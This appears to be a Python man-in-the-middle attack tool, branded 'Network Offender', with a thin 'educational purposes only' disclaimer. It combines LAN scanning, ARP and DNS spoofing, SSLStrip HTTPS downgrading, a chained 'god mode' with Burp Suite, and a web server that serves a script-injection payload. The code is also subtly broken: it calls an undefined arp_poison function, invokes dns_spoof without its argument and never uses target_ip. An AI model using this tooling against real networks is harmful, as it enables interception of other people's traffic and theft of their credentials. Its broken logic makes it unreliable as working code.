#!/usr/bin/env python3

"""
This script is for educational purposes only. Do not use it for unauthorized access or any illegal activities.
The author is not responsible for any damage or legal consequences caused by the use of this script.
"""

import os
import subprocess
import socket
import requests
from scapy.all import *
from http.server import HTTPServer, BaseHTTPRequestHandler
import random
import string
import threading
import time

def check_required_packages():
    required_packages = ['python3-scapy', 'sslstrip', 'burpsuite']
    for package in required_packages:
        result = subprocess.run(["dpkg", "-s", package], capture_output=True)
        if result.returncode != 0:
            print(f"Installing {package}...")
            subprocess.run(["apt-get", "-y", "install", package], capture_output=True)

def scan_lan():
    print("Scanning LAN...")
    subnet = "192.168.0.0/24"
    target_ips = []

    for ip in range(1, 255):
        ip_addr = f"192.168.0.{ip}"
        try:
            socket.setdefaulttimeout(1)
            socket.gethostbyaddr(ip_addr)
            target_ips.append(ip_addr)
        except socket.herror:
            pass

    print("Available targets:")
    for ip in target_ips:
        print(ip)

    return target_ips

def mitm_attack(mode, target_ip=None):
    if mode == "arp":
        arp_spoof(target_ip)
    elif mode == "dns":
        dns_spoof()
    elif mode == "https":
        sslstrip_https()
    elif mode == "god":
        god_mode(target_ip)
    else:
        print("Invalid mode. Select from 'arp', 'dns', 'https', or 'god'.")

def arp_spoof(target_ip):
    conf.iface = "eth0"
    conf.verb = 0

    gateway_ip = "192.168.0.254"

    try:
        while True:
            packets = sniff(filter="arp", prn=lambda x: arp_poison(x[ARP].psrc, x[ARP].pdst, x[ARP].hwsrc, x[ARP].hwdst))
    except KeyboardInterrupt:
        print("ARP spoofing stopped.")

def dns_spoof(packet):
    if packet.haslayer(DNSQR):
        question = packet.getlayer(DNSQR).qname
        if "google.com" in question:
            del packet[DNS].an
            packet[DNS].an = DNSRR(rrname=question, type="A", ttl=10, rdata="8.8.8.8")
            send(packet, verbose=0)

def sslstrip_https():
    print("Starting SSLStrip...")
    subprocess.run(["sslstrip", "-l", "8080", "-w", "sslstrip.log"], capture_output=True)

def god_mode(target_ip):
    print("Entering God mode...")
    arp_spoof(target_ip)
    dns_spoof()
    sslstrip_https()
    print("Starting Burp Suite...")
    subprocess.run(["burpsuite"], capture_output=True)

def start_http_server(port=8000):
    server_address = ('', port)
    httpd = HTTPServer(server_address, CustomHandler)
    print(f"Serving on port {port}")
    httpd.serve_forever()

class CustomHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/payload.html":
            payload = "<script>alert('Hacked by Network Offender by DARKC0DE')</script>"
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(payload.encode())
        else:
            self.send_error(404)
